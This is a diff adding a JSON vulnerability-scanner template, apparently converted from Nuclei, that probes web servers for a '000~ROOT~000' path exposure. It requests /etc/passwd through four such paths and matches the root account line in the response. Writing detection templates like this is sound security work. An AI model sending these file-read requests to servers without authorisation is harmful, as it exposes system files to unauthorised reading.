@@ -1,0 +1,158 @@
+{
+  "id": "root-path-disclosure",
+  "name": "ROOT - Path Disclosure",
+  "author": "soltanali0,ArganexEmad",
+  "severity": "HIGH",
+  "description": "Detects potential exposure of sensitive file paths like /000~ROOT~000/.\n",
+  "tags": [
+    "misconfig",
+    "exposure",
+    "info-leak",
+    "listing",
+    "lfr"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/home/000~ROOT~000/etc/passwd",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "^root:.*:0:0:"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        },
+        {
+          "type": "REGEX",
+          "part": "accept_ranges",
+          "values": [
+            "bytes"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": true,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "root-path-disclosure",
+    "info": {
+      "name": "ROOT - Path Disclosure",
+      "author": "soltanali0,ArganexEmad",
+      "severity": "high",
+      "description": "Detects potential exposure of sensitive file paths like /000~ROOT~000/.\n",
+      "metadata": {
+        "max_request": 4
+      },
+      "tags": "misconfig,exposure,info-leak,listing,lfr"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/home/000~ROOT~000/etc/passwd",
+          "{{BaseURL}}/000~ROOT~000/etc/passwd",
+          "{{BaseURL}}/OLDS/home/000~ROOT~000/etc/passwd",
+          "{{BaseURL}}/app/webroot/files/kcfinder/files/home/000~ROOT~000/etc/passwd"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": true,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "^root:.*:0:0:"
+            ],
+            "group": 1,
+            "internal": true
+          },
+          {
+            "type": "regex",
+            "part": "accept_ranges",
+            "regex": [
+              "bytes"
+            ],
+            "group": 1,
+            "internal": true
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
